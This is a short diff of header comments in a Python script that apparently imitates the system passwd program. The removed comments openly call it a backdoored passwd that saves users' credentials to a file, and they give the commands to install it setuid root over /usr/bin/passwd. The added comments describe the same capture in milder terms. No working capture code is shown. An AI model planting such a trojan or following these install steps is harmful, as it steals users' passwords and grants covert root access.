@@ -1,10 +1,8 @@
 #!/usr/bin/python
 
-# Backdoored passwd "binary", prompts user saves username/password to file
-# then changes password by piping credentials to chpasswd binary
-# mv passwd /usr/bin/ ; chown root:root /usr/bin/passwd; chmod 4755 /usr/bin/passwd
-#
-# Brought to you by Adam Smith :)
+# Python script that accepts username argument from c binary 
+# and emulates passwd binary, saved username/password to file 
+# and finally changes the users password
 
 import getpass, sys, time, os
 
